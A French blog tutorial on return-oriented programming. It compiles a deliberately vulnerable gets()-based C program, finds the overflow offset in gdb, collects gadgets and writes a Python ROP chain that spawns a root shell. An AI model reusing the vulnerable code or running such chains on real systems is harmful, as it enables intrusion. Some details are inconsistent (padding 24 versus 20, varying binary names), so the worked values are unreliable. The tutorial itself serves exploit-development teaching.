---
permalink: "/rop-english/"
title: "Exploitation d'une vulnérabilité de type ROP"
description: rop.jpg
tags: ["Dans cet article je vous présente comment exploiter une vulnérabilité de type ROP (Return-oriented programming) permet de contourner des mécanismes notammement l'ASLR et le système NX."]
---

![forthebadge made-with-python](https://media.giphy.com/media/xT9IgG50Fb7Mi0prBC/giphy.gif)

Comment t'allez-vous ? Après un long moment d'absence je décide de revenir pour vous proposez un article sur le `pwn`, plus précisement sur l'exploitation d'une vulnérabilité de type `ROP` (Return-oriented programming).

Vous êtes intéressé ? Alors LET'S GO !

Prérequis :
- Avoir les bases en `pwn` de comprendre et comment attaquer un buffer overflow basique.
- Et d'un ordinateur, eh eh !

# Explication du système ROP

Avant de commencer l'exploitation, il faut bien comprendre à quoi sert ce système et de comprendre son fonctionnement.

Le `ROP`, return-oriented programming, est une technique d'exploitation avancée de type dépassement de pile (stack overflow) permettant l'exécution de code par un attaquant et ce en s'affranchissant plus ou moins efficacement des mécanismes de protection tels que l'utilisation de zones mémoires non-exécutables (cf. bit NX pour Data Execution Prevention, DEP), l'utilisation d'un espace d'adressage aléatoire (Address Space Layout Randomization, `ASLR`).

Notre but concrètement c'est de récupérer des instructions du binaire pour ensuite faire un rassemblement d'instruction (les bouts d'instruction on appel ça un `gadget` c'est le langage utilisé quand nous exploitons du ROP). Imagions que nous avons des instructions basique. (C'est un exemple bien evidamment)

    push   ebp                # Instruction 1
    mov    ebp,esp            # Instruction 2
    push   ecx                # Instruction 3
    sub    esp,0x4            # Instruction 4
    call   0x804848b <secret> # Instruction 5 
    mov    eax,0x0            # Instruction 6

Imaginons que par la suite, nous décidons de prendre les instructions qui nous intéresse pour ensuite faire un rassemblement d'instruction, par exemple.

    push   ebp                # Instruction 1
    mov    ebp,esp            # Instruction 2
    mov    eax,0x0            # Instruction 6

Justement, notre but c'est de récupérer les instructions du binaire pour ensuite modifier le comportement du programme et d'exécuter quelques choses qui nous intéresse par exemple un `SHELL`, eh oui !

Alors, rassurez-vous je vais vous faire une petite démonstration, donc pas de panique.

# Fonctionnement de l'ASLR

L’address space layout randomization (ASLR) (« distribution aléatoire de l'espace d'adressage ») est une technique permettant de placer de façon aléatoire les zones de données dans la mémoire virtuelle. Il s’agit en général de la position du tas, de la pile et des bibliothèques. Ce procédé permet de limiter les effets des attaques de type buffer overflow par exemple. 

![forthebadge made-with-python](https://raw.githubusercontent.com/0xEX75/0xEX75.github.io/master/Capture%20du%202020-01-12%2009-28-41.png)

Pour être plus précis, de base lorsque l'`ASLR` est activé, les adresses (de base) ne bougent pas, c'est que il y a un système d'`OFFSET` qui va simplement générer un `OFFSET` à chaque exécution du programme, ce qui fait que les adresses changent lors de l'exécution ce qui peut compliquer l'exploitation d'un buffer overflow.

# Le programme et la compilation

Donc avant tout ça, nous allons activer l'`ASLR` (pour grosso modo randomisée la pile, le tas et également la libc) à l'aide d'une commande.

    root@0xEX75:~/rop# echo 2 | sudo tee /proc/sys/kernel/randomize_va_space

Et voici le programme en C que nous allons exploiter par la suite.

    #include <stdio.h>
    #include <stdlib.h>

    void function_vulnerability()
    {
            char buffer[8];
            gets(buffer);
            printf("%s\n", buffer);
    }

    int main(int argc, char **argv)
    {
            function_vulnerability();
            return 0;
    }

La commande pour la compilation du programme (je vais quand même vous expliquez les options), alors concrètement l'option `-m32` permet de compiler le programme avec 32 bits comme son nom l'indique.

`-static` Cette option permet grosso modo d’intégrer les bibliothèques dynamiques à notre binaire pour avoir un fichier beaucoup plus lourd. Pourquoi ? Si nous avons un fichier beaucoup plus lourd, nous aurons beaucoup plus d'instruction à mettre. Eh oui !

Et finalement l'option `-fno-stack-protector` permet de désactiver le Canari (nous aurons besoin de le désactiver pour effectuer notre attaque par buffer overflow, mais c'est très possible de bypass cette "sécurité").

    root@0xEX75:~/rop# gcc -m32 -static -fno-stack-protector vuln.c -o rop

Parfait, notre programme est prêt à être exploiter.

# Exploitation du programme

Les choses commence à être intéréssant, nous allons essayer de trouver le `padding` pour écraser le `Return Address Overwrite` ou bien `l'adresse de retour` (ou sauvegarde `EIP`).

Nous allons créer un petit pattern pour trouver le padding à l'aide d'un outil que vous pouvez installer rapidement [ici](https://github.com/Svenito/exploit-pattern) et par la suite lancer la commande juste ci-dessous.

    root@0xEX75:~/rop# pattern create 100
    Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Et lançons `gdb` (GNU Debugger), et ensuite d'envoyer les octets au programme pour trouver le bon `padding`. Il y a bien evidamment d'autre technique pour trouver le `padding` mais c'est la technique la plus amusante selon moi et plus simple aha.

    root@0xEX75:~/rop# gdb -q rop
    Reading symbols from rop...(no debugging symbols found)...done.
    gdb-peda$ r <<< Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
    Program received signal SIGSEGV, Segmentation fault.                                                                                                                            
    [----------------------------------registers-----------------------------------]                                                                                                
    EAX: 0x65 ('e')
    EBX: 0x80481a8 (<_init>:        push   ebx)
    ECX: 0xffffffff 
    EDX: 0x80ec4d4 --> 0x0 
    ESI: 0x80eb00c --> 0x80642f0 (<__strcpy_ssse3>: mov    edx,DWORD PTR [esp+0x4])
    EDI: 0x0 
    EBP: 0x61413561 ('a5Aa')
    ESP: 0xffffd540 ("Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    EIP: 0x37614136 ('6Aa7')
    EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
    Invalid $PC address: 0x37614136
    [------------------------------------stack-------------------------------------]
    0000| 0xffffd540 ("Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    0004| 0xffffd544 ("a9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    0008| 0xffffd548 ("0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    0012| 0xffffd54c ("Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    0016| 0xffffd550 ("b3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    0020| 0xffffd554 ("4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    0024| 0xffffd558 ("Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    0028| 0xffffd55c ("b7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    Stopped reason: SIGSEGV
    0x37614136 in ?? ()
    gdb-peda$

Par la suite, nous allons à nouveau utiliser le programme pour trouver pour de bon le `padding`, donc d'après le programme nous aurons besoin de `24` octets pour écraser la sauvegarde `EIP` donc l'adresse de retour. 

    root@0xEX75:~/rop# pattern offset 0x37614136 100
    20

Comme au début de l'article notre but est de pop un shell même si l'`ASLR` est open et également le système `NX`, pour ça nous devons trouver une fonction qui permet d'exécuter une commande par exemple. 

Voici une bonne liste de fonction que nous pouvons appliquer pour l'exploitation de notre programme [ICI](https://www.informatik.htw-dresden.de/~beck/ASM/syscall_list.html) bien entendu nous allons nous intéresser à la fonction numéro `11` donc la fonction `sys_execve()` pour exécuter une commande par exemple, dans notre cas /bin/sh.

![forthebadge made-with-python](https://raw.githubusercontent.com/0xEX75/0xEX75.github.io/master/Capture%20du%202020-01-11%2015-36-29.png)

Notre but, concrètement, c'est de pop des valeurs dans les registres, ce sont des registres que nous pouvons utiliser (`GPRs` registres à usage général, car il y a des registres réservée notamment `EIP` et `ESP`). 

Donc notre but c'est de mettre la valeur `11` dans le registre `EAX` et ensuite de mettre les paramètres donc par exemple `/bin/sh` comme argument dans le registre `EBX`, ce qui donnera `sys_execve("/bin/sh")` et comme la fonction `execve` prend 3 paramètres en particulier, nous allons mettre `NULL` pour `ECX` ce qui donnera `sys_execve("/bin/sh", NULL)` et enfin de mettre donc la valeur `NULL` dans le registre `EDX` ce qui donnera `sys_execve("/bin/sh", NULL, NULL)`.

Nous avons déjà une idée pour attaquer le programme en question, nous allons utiliser un programme pour trouver les instructions, j'utilise très régulièrement l'outil `ROPGadget` ou bien `rp-lin-x64` (Vous pouvez l'installer juste [ICI](https://github.com/0vercl0k/rp/releases)).

Je préfère largement utiliser l'outil `rp-lin-x64`, subjectivement beaucoup plus puissant et rapide contrairement à `ROPGadget`.

Nous allons essayer de trouver un `gadget` qui nous permettra de `pop` une valeur dans le registre `EAX` pour le nom de la fonction.

    root@0xEX75:~/rop# rp-lin-x64 -f rop -r 1 --unique | grep "pop eax"
    0x080d2f8e: pop eax ; call dword [edi+0x4656EE7E] ;  (1 found)
    0x0809d162: pop eax ; jmp dword [eax] ;  (4 found)
    0x080b8c96: pop eax ; ret  ;  (1 found)
    0x0804c35d: pop eax ; retn 0x080E ;  (4 found)
    0x080a712c: pop eax ; retn 0xFFFF ;  (1 found)

Celui-ci `0x080b8c96: pop eax ; ret  ;  (1 found)` est pas mal du tout, notons ça dans un coin, précis, car par la suite, nous aurons besoin de l'adresse dans notre script `Python`.

Ensuite cherchons une instruction qui nous permettra de mettre le premier paramètre dans la fonction. Utilions à nouveau l'outil.

    root@0xEX75:~/rop# rp-lin-x64 -f rop -r 1 --unique | grep "pop ebx"
    0x08050603: pop ebx ; jmp eax ;  (6 found)
    0x0804d057: pop ebx ; rep ret  ;  (1 found)
    0x080481c9: pop ebx ; ret  ;  (178 found)
    0x080d407c: pop ebx ; retn 0x06F9 ;  (1 found)
    
Celui-ci `0x080481c9: pop ebx ; ret  ;  (178 found)` est pas mal du tout, notons à nouveau dans un coin, précis pour la suite. Dans le registre nous allons mettre simplement la commande à exécuter lors de l'appel de la fonction.

    root@0xEX75:~/rop# rp-lin-x64 -f rop -r 1 --unique | grep "pop ecx"
    0x080df4d9: pop ecx ; ret  ;  (2 found)
    0x0805c503: pop ecx ; retn 0xFFFE ;  (1 found)
    
On continue à capturer les instructions, donc récupérons l'instruction `0x080df4d9: pop ecx ; ret` que nous mettrons `0` dans le registre donc `NULL`.

    root@0xEX75:~/rop# rp-lin-x64 -f rop -r 1 --unique | grep "pop edx"
    0x0806f1eb: pop edx ; ret  ;  (2 found)

Il manque un élement très important, c'est une instruction qui nous permettra d'exécuter notre instruction (ou bien notre fonction), l'instruction se nomme `int 0x80`.

    root@0xEX75:~/rop# rp-lin-x64 -f rop -r 1 --unique | grep "int 0x80"
    0x0806cdf3: add byte [eax], al ; int 0x80 ;  (3 found)
    0x0806cdf5: int 0x80 ;  (8 found)
    0x0806f7f0: int 0x80 ; ret  ;  (1 found)
    0x0806cdf0: mov eax, 0x00000001 ; int 0x80 ;  (1 found)
    0x0807ae09: mov eax, 0x00000077 ; int 0x80 ;  (1 found)
    0x0807ae00: mov eax, 0x000000AD ; int 0x80 ;  (1 found)
    0x0806f7ef: nop  ; int 0x80 ;  (1 found)
    0x0806cdef: or byte [eax+0x00000001], bh ; int 0x80 ;  (1 found)
    0x080b79a7: push es ; int 0x80 ;  (1 found)

Avant ça, nous allons créer notre petit script bash, qui va démarrer `/bin/sh`, nous allons utiliser `readelf` pour trouver le symbole, chaque symbole étant séparé par un caractère null-byte.

    root@0xEX75:~/rop# readelf -x .rodata ./ropme | less
    0x080bc560 64656376 745f7061 72746961 6c000000 decvt_partial...
    0x080bc570 5f494f5f 7766696c 655f756e 64657266 _IO_wfile_underf
    0x080bc580 6c6f7700 00000000 00000000 00000000 low............. # LÀ !
    0x080bc590 00000000 00000000 00000000 00000000 ................

    root@0xEX75:~/rop# echo "/bin/sh" > low
    root@0xEX75:~/rop# chmod +x low
    root@0xEX75:~/rop# export PATH=:$PATH

Nous sommes prêt maintenant pour la création de notre programme pour `pop` le shell, le script n'est pas très compliquer, donc pas de panique.

    #coding:utf-8

    import sys
    import struct

    class rop_exploit(object):
            def __init__(self, padding=20):
                    self.padding = padding

            def rop_gadgets(self):
                    rop_gadget = [
                            struct.pack('<L', 0x080b8c96), # pop eax; ret
                            struct.pack('<L', 0x0000000b), # eax (11)
                            struct.pack('<L', 0x080df4d9), # pop ecx ; ret
                            struct.pack('<L', 0x00000000), # add 0
                            struct.pack('<L', 0x080481c9), # pop ebx ; ret
                            struct.pack('<L', 0x080bc580), # program 'low'
                            struct.pack('<L', 0x0806f1eb), # pop edx; ret
                            struct.pack('<L', 0x00000000), # add 0
                            struct.pack('<L', 0x0806cdf5), # int 0x80, call function
                    ]

                    print(b'A' * self.padding + b''.join(rop_gadget))

    if __name__ == "__main__":
            p = rop_exploit()
            p.rop_gadgets()

Donc si maintenant nous lançons le programme avec l'autre 'programme' binaire.

    root@0xEX75:~/rop# python exploit.py|./buf 
    AAAAAAAAAAAAAAAAAAAA

    # id
    uid=0(root) gid=0(root) groupes=0(root)

ET BINGO, nous avons réussis à pop le shell, alors que le binaire n'était pas prévu de base.

CONCLUSION
----
Voilà, nous arrivons enfin au bout de cet article qui, je l’espère, vous aura plus. J'ai essayer de vous expliquez le fonctionnement du système ROP et comment exploiter à l'aide de ROP, n'hésitez pas à me contacter sur les réseaux sociaux, je suis toujours disponible pour vous répondre.